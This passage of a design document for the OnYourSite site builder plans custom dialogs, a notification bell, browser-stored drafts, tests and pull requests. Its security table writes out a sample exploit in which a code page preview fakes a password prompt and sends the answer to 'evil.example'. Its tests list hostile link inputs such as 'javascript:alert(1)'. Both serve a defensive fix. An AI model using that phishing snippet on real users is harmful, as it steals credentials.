- **Mark all as read** sends `{upTo: latest}` from the last poll (§5.3).
- Polling: every 60 s while visible (as `editor.js:2872`), immediately when the tab becomes visible again (if the last
  poll is > 15 s old), also without a page, and on the admin page. Answers go through `opts.handle` (normally
  `OYSUI.handle()`: session dialogs, notices).
- New items: on the first poll only a baseline is taken (as today, `lastUnread = -1`). Afterwards unread items with
  `id >` the last toasted id get a toast (type icon, title; body as second line; click = `openLink`), at most 3, then
  "+N more notifications". The last toasted id is stored per user in `localStorage` (`oys.notify.<userId>`, wrapped in
  try/catch) so two tabs do not toast the same item twice. A new `message`/`booking` reloads the open inbox.
- Admins impersonating: the bell shows the user's items; "Mark all as read" is hidden (server is read-only, §5.3).
- `team` items appear for admins in both bells and link to the admin tab (`/admin#honeycombs`, `/admin#status` …).

### 6.11 Local drafts of unsaved editor work

Unsaved changes survive a closed tab, a crash, a reload and an expired session:

- **What:** `{v: 1, at, base, page}` under `oys.draft.<userId>.<pageId>` – `page` = `payload()` (`editor.js:336-352`)
  with every `password` emptied (protected-link passwords are never stored; restored blocks ask for them again via the
  existing save check, `editor.js:358-367`); `base` = a short hash of the server state the edits started from. Code
  pages: `oys.draft.<userId>.code.<siteId>` with the changed and deleted files only.
- **When:** written 800 ms after the last change (`markDirty`, `codeChanged`), flushed on `pagehide` and
  `visibilitychange → hidden`; deleted after a successful save, after *Leave without saving*/*Discard*, and on load
  when older than 7 days. Every access is wrapped in try/catch; a quota error drops the code part first, then gives up
  (the browser's leave dialog stays the safety net).
- **Restore:** when a page (or the code tab) loads and a draft exists: dialog "Restore unsaved changes?" · "You have
  changes from 14:02 that weren’t saved." (+ "This page was saved again after that – restoring replaces that version
  when you save." when `base` differs) · *Discard* / *Restore*. *Restore* applies the draft and marks the editor dirty;
  nothing is saved automatically. Drafts of other pages show a sticky info toast "Unsaved changes on “Projects”." with
  *Open*.
- Drafts never leave the browser. They are keyed by user id, so another account in the same browser does not see
  them.

### 6.12 Texts

All UI text English (list in §7). Defaults: "OK", "Cancel", "Close", "Confirm", "Dismiss",
"Something went wrong. Please try again.", "+N more notifications", "+N more", "Type {match} to confirm",
"Please check “{label}”.", "Nothing was changed. Please confirm in the dialog – if no dialog appears, reload the
page.", "Restore unsaved changes?", "You’re logged out.", "The editor couldn’t load completely. Please reload the
page.", "Pop-ups like alert() only run on your live page."

---

## 7. Call-site plan

### 7.1 Editor (`static/js/editor.js`, `views/dashboard.php` → `app/src/views/dashboard.ts`)

**Re-check rule for every converted call site.** A native `confirm()` blocked the page, so the code after it saw the
same state; a promise does not. Example: the user clicks *Save*, then a block's bin; the save answer arrives while the
dialog is open, `version === sentVersion`, and `editor.js:384-388` replaces `state.blocks` with new objects; *Delete*
then runs `filter(x => x !== b)` (`:1577`) and removes nothing, while the editor is marked dirty. Therefore, after the
await, every call site **looks its objects up again by id** – through `renamed`, a map of `idmap` renames kept by the
save handler (`:379-383`) – and re-checks what it depends on (page, site, existence) before acting.

| # | Where | New dialog: title · text · buttons (tone) | Code change | After the dialog |
|---|---|---|---|---|
| 1 | `:575-580` page switch | "Switch pages?" · "You have unsaved changes. They’re lost if you switch now." · Stay / Switch without saving (danger) | `guard.confirm({…})` → `guard.navigate(url, {force: true})`; `leaving` removed | target still in `state.pages` and not the current page |
| 2 | `:1146-1148` quick add | "Embed this YouTube link?" · "Show it right on your page, or add it as a normal link button." · Add as link / Embed it | `OYSUI.choice()`; `null` → keep the URL, focus the field; `quickAdd` becomes promise-based | `state.page` still set; push into the **current** `state.blocks`; clear the field only if it still holds that URL |
| 3 | `:1576-1577` block | "Delete this block?" · "It’s removed from your page when you save." · Cancel / Delete (danger) | `OYSUI.confirm({…, fallbackFocus})` | `blockById(renamed[id] \|\| id)`; gone → nothing; remove **by id** |
| 4 | `:2093` message | "Delete this message?" · "The message from {name} is deleted for good." · Cancel / Delete (danger) | `onConfirm` runs `api('message', {id, action:'delete'})`; then toast "Message deleted." + `loadMessages()` | server deletes by id and user (repeatable); inbox reloads |
| 5 | `:2099` booking | "Delete this booking request?" · "{date} · {time} from {name} is deleted for good." · Cancel / Delete (danger) | same with `booking-delete` | same |
| 6 | `:2502` code file | "Delete {path}?" · "It’s removed from your code page when you save." · Cancel / Delete file (danger) | `OYSUI.confirm()` | same `code.st.site.id`; `has(code.files, p)` and `p !== 'index.html'` |
| 7 | `:2583` code address | "Move your code page?" · "New address: {slug}.{host}. The old address stops working right away." · Cancel / Move (warn) | confirm → `codeSettings('code-address', …)` | same site id; re-read the field; still `!== code.st.site.slug` |
| 8 | `:2777` page delete | "Delete page “{slug}”?" · "All its blocks, stats and messages are deleted. This can’t be undone." · field "Type {slug} to confirm" · Cancel / Delete page (danger) | `OYSUI.prompt({match: slug, normalize: 'slug', transform: 'slug', onConfirm: api('page-delete', …)})`; success → `guard.navigate('/dashboard#settings', {force: true})` (`dirty = false` removed) | server checks `confirm === slug` (`lib/routes_app.php:454-456`); drafts of other pages are offered after the reload |
| 9 | `:692-717` create page (`:711`) | when dirty: "Create the page without saving?" · "You have unsaved changes on this page. They’re lost if you continue." · Cancel / Create without saving (danger) | asked **before** `page-create`; success → `guard.navigate('/dashboard?page=' + id, {force: true})`; `dirty = false` removed | still dirty? (a save that finished meanwhile → no question) |
| 10 | `:408-411` beforeunload | "Leave without saving?" · "You have changes that aren’t saved yet. They’re lost if you leave now." · Stay / Leave without saving (danger) | `var guard = OYSUI.guard({isDirty: function () { return dirty \|\| codeUnsaved(); }, onDiscard: draft.clearCurrent, keepsDraft: true})`; own `beforeunload` removed | – |
| 11 | `:412-415` keys | – | `Ctrl+S`: always `preventDefault()`, save only when `!OYSUI.isOpen()`; Escape: only `closeDropdowns()` when no layer is open | – |
| 12 | `:675-690` modal | – | `openModal` registers `#modal` once via `OYSUI.layer(#modal, {labelledBy:'modalTitle', onEscape: closeModal})`; `closeModal` releases it (focus returns). `<h3 id="modalTitle">`, ✕ gets `aria-label="Close"`, `#modalBox` gets `role="dialog" aria-modal="true" aria-labelledby="modalTitle"` | – |
| 13 | `:55-60` toast | – | delegate to `UI.toast`; `#toasts` removed from the Node view | – |
| 14 | `:62-79` `api()`, `:116-124` upload, `:441-446` preview | – | one `request(url, {json \| form \| text})` used by all three: CSRF header, `UI.handle(status, data)` (session dialogs, notices), "No connection to the server."; the preview's JSON error detection moves into it | – |
| 15 | session dialogs (in `OYSUI.handle`) | 401: "You’re logged out" · "Log in again to continue. Your unsaved changes are kept in this browser and offered again after you log in." · Close / Log in · 419: "Your session has expired" · "Reload the editor to continue. Your unsaved changes are kept in this browser." · Close / Reload · 409/400 + `reload`: "Reload the editor" · server text · Close / Reload | *Log in* → `guard.navigate('/login', {force: true})`; *Reload* → `guard.reload({force: true})` (no second, native question); *Close* → sticky toast "You’re logged out." with *Log in*; one session dialog at a time | – |
| 16 | `:2849-2852` flash | – | unchanged (`OYS_FLASH`), shown through `UI.toast` | – |
| 17 | new | offline / online toasts (§3.1) | `window` `offline`/`online` listeners | – |
| 18 | `:2853-2858` earned | unchanged texts, yellow `hc` toasts | `UI.notices(…, {label: 'History', link: '/dashboard#honeycombs'})` (queue, nothing lost); later honeycomb-shop's bootstrap `notices` take this place | – |
| 19 | big / mobile preview | – | registered with `OYSUI.layer` for Escape and Back | – |
| 20 | `views/dashboard.php:197`, `editor.js:2625` code preview iframes | hint under the code preview: "Pop-ups like alert() only run on your live page." | `sandbox="allow-scripts allow-forms allow-popups"` – **`allow-modals` removed** (§8) | – |
| 21 | `:1029-1031` messages tab | – | `loadMessages()` runs before `if (!state.page) return;`; the "Add a contact form" hint is hidden without a page | – |
| 22 | `:641-670`, `:2871-2872` bell | §6.10 | `OYSBell.mount(…)` (loads `bell.js` itself when the view did not include it); polling regardless of `state.page` | – |
| 23 | new | §6.11 | draft module (write, flush, restore, clear) | – |
| 24 | top of `editor.js` | – | `var UI = window.OYSUI \|\| legacyUI();` until 3.1 (§11.2); after 3.1: missing `OYSUI` → in-page notice, no editing | – |

### 7.2 Admin (`views/admin*.php` → `app/src/views/admin*.ts`; texts are rendered with `e()` into attributes)

Every form below gets `confirmAttrs(…)` and `confirmField()`, so it is server-checked (§5.6). `{name}`/`{email}` are
filled in by the server template.

| File:line | `data-confirm` · `-text` · `-ok` · `-tone` |
|---|---|
| `admin.php:439` | "Log in as {name}?" (already in `data-confirm`) · "You’ll see the editor as this user. “Back to admin panel” brings you back." · Log in as user |
| `admin.php:449` | "Make {name} an admin?" / "Remove admin rights from {name}?" (by current role) · "Admins can see and change everything." / "{name} loses access to the admin panel." · Make admin / Remove admin rights · warn |
| `admin.php:454` | "Delete this user?" · "{name} ({email}) and all their pages, stats, messages and uploads are deleted. This can’t be undone." · Delete user · danger |
| `admin.php:485-535` newsletter (button `:532`) | via `beforeSubmit` (below) · Send email · warn |
| `admin_updates.php:141` | "Delete this update?" · "Its Discord post is deleted too." (only with a Discord post) · Delete · danger |
| `admin_updates.php:226` | "Remove this task?" · – · Remove · danger |
| `admin_updates.php:248` | "Delete this milestone?" · "Its tasks are deleted too." · Delete · danger |
| `admin_updates.php:270` | "Disconnect Discord?" · "Saved links and tokens are removed." · Disconnect · danger |
| `admin_community.php:152` (button) | "Close this ticket?" · – · Close ticket · warn |
| `admin_honeycombs.php:123` | "Block this code page?" · "Visitors will only see a notice." · Block · danger |
| `admin_honeycombs.php:156` | "Unlock the code page for free?" · "This user gets the code page without paying honeycombs." · Unlock |

Newsletter (in the admin page script, which runs inline at the end of the body and therefore registers on
`DOMContentLoaded`, after the deferred `ui.js`). The single-address field becomes `required` only while "Test /
Single User" is chosen (`toggleSingleEmail`, `views/admin.php:667-675`):

```js
// Newsletter: Empfänger im Dialog nennen – bei „Test / Single User“ die Adresse
document.addEventListener('DOMContentLoaded', function () {
  var f = document.getElementById('newsletterForm');
  if (!f || !window.OYSUI) return;                      // ohne ui.js lehnt der Server ab (_confirmed = 0)
  OYSUI.beforeSubmit(f, function (form) {
    var a = form.audience;
    var to = a.value === 'single' ? form.single_email.value.trim() : a.options[a.selectedIndex].text;
    return { title: 'Send this email?', text: 'Template “' + form.template_file.value + '” to ' + to + '.',
             ok: 'Send email', tone: 'warn' };
  });
});
```

Also: `#pwdModal` (`admin.php:601-621`) registered with `OYSUI.layer` (+ `role`, `aria-modal`, `aria-labelledby`);
trigger `onclick="openPwdModal(id, 'addslashes(name)')"` (`:447`) becomes `data-pwd-reset="{id}"
data-name="{e(name)}"` with one delegated listener, the two close buttons (`:605,616`) get `data-close`. Flash banners
(`:351-360`) → `flashBanner()` (§5.5). The header gets the bell (§6.10). Texts for the global form check: "Please
choose a template." (`data-error-required` on `:493`), "Please choose a user.", "Please enter a title.", "The date
can’t be in the future." (`data-error-max`). If the admin split (code-slots-admin) or the Discord rework
(discord-pages) lands first, these attributes move with the markup.

### 7.3 Sign-up, login, account forms

No `novalidate` needed any more (§6.7); only custom texts:

| Form | Change |
|---|---|
| `views/login.php:64` | email `data-error-required="Please enter your email address."`; password `data-error-required="Please enter your password."` |
| `views/register.php:66` | address wrapper `data-field`, `minlength="2"`, `data-error-required="Please choose your address."`, `data-error-short="Use 2–30 characters: a–z, 0–9 and hyphens."`; name "Please enter your name."; password `data-error-short="Your password must be at least 8 characters long."` |
| `views/dashboard.php:158,167` | `confirm_new_password` `data-match="new_password" data-error-match="The new passwords don’t match."`; `data-guard="off"` is **not** set – the leave guard asks first when the editor has unsaved changes |

### 7.4 Profile pages and simple pages

Every change keeps working without `OYSUI` (the PHP rollback serves these pages without `ui.js`).

| Where | Change |
|---|---|
| `lib/render.php:212` → `render/page.ts` | `<script src="/static/js/ui.js?v=…" defer>` before `page.js` |
| `lib/render.php:555-562` → `render/simple.ts` | same tag (booking and gate pages get the form checks) |
| `page.js:51-75` | `openModal` → `OYSUI.layer(modal, {labelledBy:'oys-modal-title', onEscape: closeModal})`; own Escape listener (`:73`) and `lastFocus` handling removed; falls back to today's code when `OYSUI` is missing |
| `page.js:155` | the JS-built unlock input gets `data-error-required="Please enter the password."` – the global check shows it, no request |
| `page.js:288-324` + `lib/render.php:526-535` | `novalidate` stays; the submit handler calls `OYSUI.validate(form)` when present (per-field errors: name "Please enter your name.", email "Please enter a valid email address.", message `minlength="5"` "Your message is a bit short.", server text `lib/spam.php:40`); without `OYSUI` today's generic status line |
| `page.js:273-281` lightbox | `role="dialog"`, close button, `OYSUI.layer(lb, {onEscape: close})` |
| `views/kalender.php:77-85` | texts from the server (`:27-32`, the name/email message split per field) as `data-error-*`: "Please enter your name.", "Please enter a valid email address.", "Please choose a date between today and one year from now.", "Please choose a time." |
| `lib/routes_public.php:74` | `data-error-required="Please enter the password."` |

### 7.5 Other

- `lib/codesites.php:117` (starter `script.js` for **new** code pages, port in `content/codesites.ts`): instead of
  `alert(…)` the button writes "Hello from your own website!" into the page (it would do nothing in the preview now).
  Existing code pages are not touched.
- Lint `tools/check-native-dialogs.mjs` in `npm run lint`, over `static/js/*.js` (except `ui.js`), `app/src/views`,
  `app/src/render`:
  - native dialogs: `/(?<![\w$.])(?:(?:window|globalThis|self|top|parent)\.)?(alert|confirm|prompt)\s*\(/` – does not
    match `OYSUI.confirm(` or `guard.confirm(`, does match `confirm(` and `window.alert(`;
  - inline confirmations: `onsubmit=` and `on[a-z]+="return confirm`;
  - in scripts that call `OYSUI.guard(`: `location.href =`, `location.assign(`, `location.replace(`,
    `location.reload(`, `window.location =` (use the guard);
  - in `app/src` outside `app/src/notify/`: `INSERT INTO notifications` (use `notify()`, PR 5a);
  - allowed only between `/* oys-legacy:start */` and `/* oys-legacy:end */` (the rollback fallback, §11.2) until
    release 3.1; the 3.1 cleanup removes the blocks and the exception.
  - Warning-only until PR 4, then an error – so the other features cannot bring native pop-ups back.

---

## 8. Security, abuse and limits

| Risk | Measure |
|---|---|
| **Fake browser dialogs over the editor from code page previews** (phishing admins) | Exploit today: a user puts `setTimeout(() => { const p = prompt('OnYourSite security check: session expired, enter your password'); fetch('https://evil.example/?p=' + encodeURIComponent(p)); }, 1500)` into `script.js`, asks the team in a ticket to "check my code page in the editor"; an admin uses "Log in as" (`views/admin.php:439`) and opens the Code tab; the browser prompt covers on-your.site/dashboard; the code page CSP is only `sandbox …` (`lib/codesites.php:16,243`), so the fetch goes out. **Fix:** both preview iframes lose `allow-modals` (§7.1 row 20); `alert/confirm/prompt` there return at once. The live code page is opened in its own tab with its own address (Q1) |
| XSS through dialog or toast text (user names, slugs, file names, contact names in notifications) | `textContent` only for every library text; `content` builders follow the `openModal` rule (DOM or `esc()`); server attributes escaped with `e()`; bell rendering keeps `esc()`; icon classes whitelisted by regex |
| Malicious notification links (open redirect, `javascript:`, `/\host`) | `safeLink()` on insert and on output; the client re-checks with the same regex **and** a same-origin `URL` check (§6.10) |
| Admin form submitted without the dialog (ui.js broken) | server refuses `_confirmed=0` (§5.6) – fail closed |
| Double submission (newsletter has no idempotency, `views/admin.php:150-197`) | submit buttons disabled + `aria-busy` after the confirmed submit until `pageshow` |
| Accidental destructive confirm | danger/warn dialogs focus *Cancel*; Escape/backdrop/✕/Back always cancel; busy state blocks double clicks; type-to-confirm for page deletion (server still checks `confirm === slug`, `lib/routes_app.php:454-456`) |
| Acting on stale state after an async dialog | re-check rule (§7.1): lookup by id with `idmap` renames, existence and context checks after every await |
| Toast action fired under a busy dialog (e.g. during a purchase) | toast clicks only dismiss while a layer is open; actions wait (§6.3) |
| Wrong action after confirm | re-submit keeps the pressed button's `name/value` and the CSRF field; no new GET actions |
| CSRF on new behaviour | only `notifications-read` changes state: POST + CSRF via the existing API preamble |
| Reading other users' notifications | every query has `user_id = ?` from the session; single-read and `upTo` also filter by `user_id` |
| Marking unseen notifications read | `upTo` = newest item the user has seen (§5.3) |
| Notification flooding (contact spam from many IPs, buggy jobs) | contact/booking rate limits stay; jobs keep their own idempotency; bell shows 15; at most 3 toasts per poll; toast queue with "+N more" |
| Admin impersonation hides a user's news | read-only bell while impersonating |
| Spoofed "OnYourSite" dialogs on profile pages | dialogs there are in the page's theme and never ask for OnYourSite credentials; owners cannot run scripts on profile pages |
| Drafts in browser storage | keyed by user id; protected-link passwords never stored; deleted after save, discard and after 7 days; never sent anywhere. On a shared computer a draft survives only an involuntary exit (expiry, crash, closed tab) – a deliberate "Leave without saving" deletes it |
| Breaking out of the flash markup | banners rendered with `e()` (§5.5); `OYS_FLASH` keeps `JSON_HEX_TAG` (`views/dashboard.php:236`) |
| Trapping visitors | leave guard only on the editor, only for same-tab navigation; tab close keeps the browser's dialog |
| Polling cost / abuse | authenticated GET, one indexed query + two counts; no rate-limit writes per poll; client interval ≥ 60 s (15 s minimum on refocus) |
| Private areas indexable | no new pages; dashboard/admin keep `noindex` |
| Client checks bypassed | server validation unchanged everywhere |

Limits: 4 visible toasts (queue behind), 300 characters per toast, 5 stacked layers, 3 `notices` per answer, 12 in the
bootstrap, 15 bell items, 3 toasts per poll, drafts 7 days. Nothing is deleted from `notifications` unless the owner
enables retention (Q5). Observed (not changed here): the admin password reset accepts any non-empty password
(`views/admin.php:137`) – the admin area owner may add the same 8-character rule as sign-up.

---

## 9. Tests

**Unit (`node:test`, `app/test/notify.test.ts`)**
- `notify()`: truncation by code points (190/255, emoji and combining marks), `body ''`, local `created_at`, `link`
  through `safeLink`, `opts.db` inside a transaction (rolled back → no row); `notifyAdmins()` one row per admin.
- `safeLink()`: accepts `/dashboard#messages`, `/dashboard#honeycombs/premium`, `/suggestions?x=1`; rejects
  `//evil.test`, `https://x`, `javascript:`, `/\evil`, control characters, > 255 bytes.
- Catalogue lookup: exact, prefix (`domain_new` → `domain`), unknown → `bx-bell`.
- Bell API with `makeTestCtx`: key order and new fields, works without a page, single read only touches own rows,
  `upTo` leaves newer rows unread, invalid id/upTo → 400, impersonation → `readonly` and no write, logged out → 401,
  bad CSRF → 419. `messages`, `message`, `booking-delete` work without a page and only on own rows.
- `_confirmed` check: admin POST with `_confirmed=0` → nothing changed + flash; with `1` → handler runs; without the
  field → unchanged behaviour; same for the impersonation route.
- Migration: runs twice without error; existing rows intact.
- `flashBanner()`: reads and deletes the keys; markup escaped.

**Component tests (Playwright, `tests/e2e/ui-kit.js`, page built with `setContent` + `addScriptTag/addStyleTag` from
`static/`)**
- alert/confirm/prompt/choice resolve values; Escape/✕/backdrop semantics per kind; busy + error string + retry.
- `content` builder, `ctl.values()` (checkbox, radio, text), `canConfirm` enabling OK, `ctl.update()` (title, ok,
  content) keeping focus inside, `ctl.message()`, `onConfirm` returning `false`/string/`undefined`.
- `match` + `normalize`: `slug`; `host` with `bücher.de` against `xn--bcher-kva.de` and a pasted
  `https://Links.Example.com/path`; OK disabled until equal.
- Roles: `alertdialog` for alert/confirm, `dialog` for prompt/choice/overlays; labels.
- Keys: Escape and Enter with `isComposing: true` do nothing.
- Focus: initial focus per tone and the disabled-target rule, Tab/Shift+Tab cycle, focus restore, fallback when the
  trigger is gone.
- Stacking: confirm over a registered layer – Escape closes only the top; `inert` set and fully restored; 6th dialog
  resolves as Cancel; `layer()` on a non-body child returns `null`.
- Back gesture: a stub `window.CloseWatcher` whose `close` is fired → top layer cancelled; without `CloseWatcher` no
  error.
- Scroll: long page scrolled to 1200 px, open and close → `scrollY` unchanged, no horizontal shift of a fixed element;
  the same with `CSS.supports` stubbed to return `false` (padding fallback runs).
- Themed page without `ui.css`: base rules injected, scroll lock works, a long dialog body scrolls within
  `min(86vh, 86dvh)`.
- Toasts: live regions, pause on hover, queue (6 toasts → 4 visible, 2 follow, none lost), `notices` batch of 9 →
  5 + "+4 more", de-duplication, `id` replace, sticky close; with a dialog open a toast click only dismisses and the
  action runs only after the dialog is closed.
- Global `invalid` handler: every validity case and text, a JS-built form gets the message without any attribute, no
  bubble (`page.on('dialog')` stays silent and the message element exists), hidden invalid field → toast, `data-match`,
  `[data-field]` placement, first error focused.
- `data-confirm`: cancel → no request (`page.route` asserts no POST); confirm → exactly one POST with the submitter's
  `name=value`, the CSRF field and `_confirmed=1`; a second click sends nothing (buttons disabled);
  `data-confirm-match/into/normalize`; `beforeSubmit` returning `null`/`false`/options.
- **Old Safari paths in current engines:** with `HTMLFormElement.prototype.requestSubmit` deleted by `addInitScript`,
  the confirmed re-submit still sends the submitter's `name=value` (hidden-input fallback).
- `openLink`: `/\evil.example`, `//evil.example`, `https://evil.example`, `javascript:alert(1)` are ignored; own paths
  open.

**End-to-end (`tests/e2e/e2e-dialogs.js`, Playwright 1.63 as in `plan.md` §4.6)** – a global handler makes **any**
native dialog fail the run, except an intended `beforeunload` in tests that check it; it dismisses the dialog first so
the page does not hang:

```js
// Jeder native Dialog ist ein Fehler – außer einem erwarteten beforeunload in Tests, die genau das prüfen
page.on('dialog', async (d) => {
  if (d.type() === 'beforeunload' && t.expectBeforeUnload) { await d.accept(); return; }
  await d.dismiss();                                    // erst schließen, sonst hängt die Seite
  failures.push(d.type() + ': ' + d.message());
});
```

1. Editor: delete block (cancel/confirm), quick-add YouTube (embed / link / dismiss), page switch with unsaved
   changes (stay / switch), logout with unsaved changes, delete message and booking (DB rows gone, toast), code file
   delete and address move, delete page (button disabled until match; last page → inline error; success → redirect).
2. **Save race:** `page.route('**/dashboard/api/save', …)` holds the answer; click *Save*, then a block's bin; release
   the answer while the dialog is open; *Delete* → the block is gone, the editor is dirty; *Save* → the DB has no
   such block.
3. **Navigations:** create a page with unsaved **code** → our dialog, no native one; *Create without saving* → new page
   opens, draft deleted. *Reply* (`mailto:`) while dirty → no dialog of any kind; afterwards
   `page.close({runBeforeUnload: true})` with `expectBeforeUnload` → the browser dialog still appears (protection not
   switched off).
4. **Session and drafts:** dirty editor → expire the session row → `visibilitychange` → 401 dialog once → *Close* →
   sticky toast, text still selectable → *Log in* → log in → "Restore unsaved changes?" → *Restore* → content back and
   dirty → *Save* → DB has it. 419 → *Reload* → no native dialog.
5. Notifications: insert a row for mia via SQL → after `visibilitychange` the toast and badge appear; click → messages
   tab, row read; 5 rows at once → 3 toasts + "+2 more"; a second tab does not toast again; impersonation → no write;
   *Mark all as read* after a new row arrived → the new row stays unread; a code-slots-style account with no shown
   link page → message notification opens the inbox.
6. Admin: each confirm form, cancel vs confirm (DB checked); ticket close sends `ticket_close`; newsletter dialog
   names the single address and a double click sends one batch; flash → toast (success gone after 5 s, error stays);
   reset-password modal Escape and inline error; the admin header bell shows a `team` row and opens its tab.
7. **ui.js blocked** (`page.route('**/static/js/ui.js*', r => r.abort())`): admin *Delete user* → user still in the
   DB, error banner visible; editor before 3.1 → the legacy path asks natively (this test accepts it) and still
   saves; after 3.1 → the in-page notice.
8. Code preview: a code page whose `script.js` calls `alert()` on load → no `dialog` event within 2 s in the small and
   the large preview; the hint is visible.
9. Auth: register/login/account forms with invalid input → inline errors, `aria-invalid`, focus on the first; server
   messages unchanged for bypassed checks.
10. Profile pages in 3 themes (one dark, one light, one colourful): protected link (focus trap, empty → inline error,
    Escape restores focus and scroll), contact form per-field errors, lightbox Escape, booking page errors; computed
    dialog background equals the theme's `--surface`.
11. Mobile 390×844: dialogs fit, buttons reachable, inputs 16 px (no zoom), no horizontal scroll.
12. The existing suites (`page.on('dialog', d => d.accept())` in e2e1/2/3/6 and `community-ui.js`) are updated to
    click the custom dialog buttons in the PR that converts each call site.

**PHP rollback smoke** (until 3.1; CI has PHP 8.3, `plan.md` §4.7): the PHP router serves the dashboard with the new
`static/` files – no script error, block delete asks natively, toasts and `OYS_FLASH` show, the bell lists items.

**Manual check** (release checklist): the code page preview shows no dialog in Chrome, Firefox and Safari; on a live
code page the dialog title each browser shows is recorded for Q1.

Snapshots: the Node view goldens of changed pages are re-approved per PR (`plan.md` §3.4 approach).

---

## 10. Installer and operations

- **Static files** ship with the code; no Apache or Cloudflare change (the vhost proxies `/static` to Node,
  `plan.md` §5.1; `?v=` versions bust caches).
- **Migration** (one index) runs with `node app/dist/cli.js migrate` in `step_website` as planned (`plan.md` §5.2).
- **No timer, no service, no new secrets, ports or Cloudflare token permissions.** The first draft's own
  `onyoursite-notifications` timer is gone; retention, if the owner wants it (Q5), becomes a nightly step of a shared
  job runner (§5.7) – `write_timers()` (`server/install.sh:1326-1408`) needs no change for this feature.
- **Rollback:** `--rollback` keeps working while PHP exists (§11.2); the index is invisible to PHP.
- **Capacity (the server now has 16 vCPUs):** nothing CPU-heavy is added – static files, one cheap indexed query per
  open editor or admin tab per minute, no job. `plan.md` runs Node as one process; this design keeps no state in
  server memory (polling instead of server-sent events, drafts in the browser), so it stays correct if the app is
  later spread over several processes on the extra cores.

---

## 11. Delivery plan and dependencies

### 11.1 Pull requests (after the parity gate, each reviewable on its own)

| PR | Title | Content | Size | Needs |
|---|---|---|---|---|
| 0 | Dialog contract | `static/js/ui.d.ts` (§6.2) + the attribute table; sign-off from honeycomb-shop and code-slots-admin, review by premium-domains, status-pages, discord-pages | ~150 lines | – |
| 1 | Add own dialogs and notices | `ui.js` (dialogs, controller, layer stack, CloseWatcher, base styles, toasts + queue + notices, `handle()`, global `invalid` handler, submit pipeline, guard, `openLink`), `ui.css`, page skin in `page.css`, `views/partials/ui.ts` (`uiAssets`, `confirmAttrs`, `confirmField`, `flashBanner`, `bellMarkup`), tags on every Node page, lint (warning), component tests | ~1,000 | PR 0, parity gate |
| 5a | Notification core and bell API | migration (index), `app/src/notify/*`, `notify()` for contact/booking, routes §5.3 (account-level, `upTo`), catalogue rows for all six designs, lint against raw `INSERT INTO notifications`, unit + HTTP tests | ~300 | parity gate only |
| 2 | Editor: own dialogs instead of browser pop-ups | §7.1 rows 1–21, 23–24; `request()`; drafts; preview `allow-modals` removed; `defer` on editor scripts; legacy adapter if before 3.1; e2e flows 1–4, 7 (editor part), 8, 11 | ~550 | PR 1 |
| 3 | Admin and sign-in: own confirmations and form checks | §7.2, §7.3; `_confirmed` server check (§5.6); e2e flows 6 (without the bell), 7 (admin part), 9 | ~250 | PR 1 |
| 4 | Profile pages: themed dialogs and form checks | §7.4, §7.5 starter; lint rule becomes an error; e2e flow 10 | ~200 | PR 1 (PR 2/3 merged so the lint passes) |
| 5b | Bell in the editor and the admin header | `bell.js`, §6.10, §7.1 row 22, admin header bell, toasts for new items; e2e flow 5 and the bell part of 6 | ~350 | PR 1, PR 2, PR 5a |
| 6 | Notification retention (optional) | §5.7 – only after the owner said yes (Q5) and a shared job runner exists | ~120 | 5a, owner decision |

PR 5a can merge right after the parity gate, before any feature that writes notifications (discord-pages' v6/v7
migration, code-slots-admin, honeycomb-shop's jobs, premium-domains, status-pages); until it lands, such a feature
keeps a local helper that the 5a PR (or the feature's next PR) replaces. PR 2, 3 and 4 can be reviewed in parallel.
PR 1 should land first among all UI work of the user features (honeycomb-shop's suggested global order already starts
with "custom-dialogs core", `honeycomb-shop.md` §9). Where other designs say "custom-dialogs PR 5", they mean 5a
(`notify()`, the account-level routes) or 5b (bell polling without a page, bell UI).

### 11.2 Rule R – the PHP rollback until release 3.1

`install.sh --rollback` swaps the vhost back to PHP on the same tree (`plan.md` §5.6: "No `git checkout` is needed
because the 3.0 tree still contains the PHP code"), so PHP then serves the **same** `static/` files with its
**unchanged** views – `views/dashboard.php:231-239` loads `editor.js` without `ui.js`, and its editor flash is
`window.OYS_FLASH`. Until release 3.1 deletes the PHP code (`plan.md` §5.7), every PR here that changes a shared static
file keeps the PHP-served pages working:

- `editor.js` starts with `var UI = window.OYSUI || legacyUI();` – a marked block (`/* oys-legacy:start */ …
  /* oys-legacy:end */`, ≈ 40 lines) that behaves like today: native `confirm/prompt` (with `onConfirm` run after OK and
  a returned string shown as error toast), the old DOM toast into `#toasts` (created when missing), `handle()` that
  only returns the data, a plain `beforeunload` guard, `navigate()` = `location.href`.
- `editor.css` keeps `.toasts` and `.toast*` (`:311-316`, `:429`) untouched; `OYS_FLASH` stays the editor's flash.
- `page.js` guards every `OYSUI` use and falls back to today's code (§7.4).
- `bell.js` is loaded by `editor.js` itself when missing and accepts PHP's answer shape (§6.10).
- The only schema change is an index, which PHP ignores – so this feature needs **no** `--rollback` refusal. Features
  whose PHP fallback cannot work (new editor APIs the PHP editor cannot serve) need one; that belongs in `plan.md`
  §5.6, not in this design.
- The 3.1 cleanup PR deletes the legacy blocks, the `.toast*` rules and the lint exception, and makes a missing
  `OYSUI` stop the editor with an in-page notice. PRs merged after 3.1 skip all of this.

### 11.3 What this feature needs from the others (checked against all five designs)

**Name mapping** – the other designs used placeholder names; they adopt the canonical API of §6.2:

| Design: placeholder | Canonical |
|---|---|
| honeycomb-shop `dialog.confirm({title, html, confirmLabel, tone})` (`honeycomb-shop.md` §1.5, §5.2) | `OYSUI.confirm({title, content, ok, tone: 'hc', canConfirm, onConfirm})` |
| honeycomb-shop `notify({tone:'hc', icon:'bx-hive', title, text, amount, action})` with a queue | server `notices[]` + `OYSUI.notices()`; direct toasts `OYSUI.toast({tone: 'hc', title, text, amount, action})` (icon follows the tone) |
| code-slots-admin (revised): `OYSUI.confirm({title, text, list, tone, ok, onConfirm})`, `OYSUI.prompt({…, match, transform: 'slug', onConfirm})` (`code-slots-admin.md` §5, §9.2) | already canonical; add `normalize: 'slug'` so a pasted address with capitals still matches |
| code-slots-admin admin *Delete* (`confirm` = slug, §4.6): now a visible typed field checked by the server + `data-confirm` | works as is with `confirmAttrs()` + `confirmField()`; `data-confirm-match/-normalize/-into="confirm"` is available if the field should live inside the dialog |
| premium-domains `confirm({title, message, confirmLabel, danger, typeToConfirm})`, `choose({title, message, buttons})` (`premium-domains.md` §9) | `OYSUI.prompt({title, text, ok, tone: 'danger', match: unicodeHost, normalize: 'host'})`, `OYSUI.choice({title, text, options})` (apex dialog: 3 options) |
